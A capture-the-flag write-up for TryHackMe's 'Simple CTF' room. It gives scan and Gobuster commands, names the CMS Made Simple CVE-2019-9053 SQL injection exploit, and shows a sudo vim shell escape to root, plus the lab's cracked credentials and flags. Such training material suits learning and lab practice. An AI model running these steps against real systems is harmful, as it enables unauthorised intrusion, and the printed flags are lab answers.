# Simple CTF

**Difficulty:** Easy  
**Target:** TryHackMe – Simple CTF

## 1. Enumeration

Initial Nmap scan:

```bash
nmap -sC -sV -p- TARGET_IP
```

Open ports:
- `21/tcp` — FTP (vsftpd 3.0.3)
- `80/tcp` — HTTP (Apache 2.4.18)
- `2222/tcp` — SSH (OpenSSH 7.2p2)

Anonymous FTP access was enabled.

## 2. FTP Enumeration

Found `/pub/ForMitch.txt` containing a message indicating that the system user reused a weak password.

This revealed the username `mitch`.

## 3. Web Enumeration

Gobuster revealed a hidden directory:

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt
```

Found `/simple/`, running **CMS Made Simple 2.2.8**.

The application was vulnerable to **CVE-2019-9053 — Time-Based Blind SQL Injection**.

Used Exploit-DB exploit `46635.py` to extract the password hash and crack it with `rockyou.txt`.

Recovered credentials:

```text
mitch:secret
```

## 4. Initial Access

Connected via SSH:

```bash
ssh mitch@TARGET_IP -p 2222
```

Retrieved the user flag:

```bash
cat user.txt
```

## 5. Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Found that `mitch` could run Vim as root without a password:

```text
(root) NOPASSWD: /usr/bin/vim
```

Abused Vim's shell escape:

```bash
sudo vim -c ':!/bin/sh'
```

Verified root access:

```bash
id
```

Retrieved the root flag:

```bash
cat /root/root.txt
```

## 6. Flags

- **User:** `G00d j0b, keep up!`
- **Root:** `W3ll d0n3. You made it!`

## Key Takeaways

- Anonymous FTP enumeration
- Directory brute-forcing with Gobuster
- Time-Based Blind SQL Injection
- Exploiting CMS Made Simple (CVE-2019-9053)
- Password hash cracking
- Linux privilege escalation through misconfigured sudo permissions and Vim
